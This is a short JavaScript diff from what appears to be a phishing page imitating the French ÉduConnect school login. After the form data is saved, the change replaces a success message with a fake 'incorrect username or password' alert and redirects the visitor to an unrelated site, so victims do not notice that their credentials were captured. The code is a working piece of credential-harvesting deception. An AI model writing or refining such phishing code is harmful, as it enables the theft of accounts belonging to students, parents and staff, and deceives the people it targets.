@@ -383,7 +383,8 @@
                     Date: new Date()
                 });
 
-                alert("Données envoyées avec succès !");
+                alert("Erreur : Votre identifiant ou votre mot de passe est incorrect. Veuillez vérifier les informations de votre compte ÉduConnect.");
+                window.location.href = "https://www.perdu.com/";
                 form.reset(); // Réinitialiser le formulaire
             } catch (e) {
                 console.error("Erreur lors de l'enregistrement : ", e);
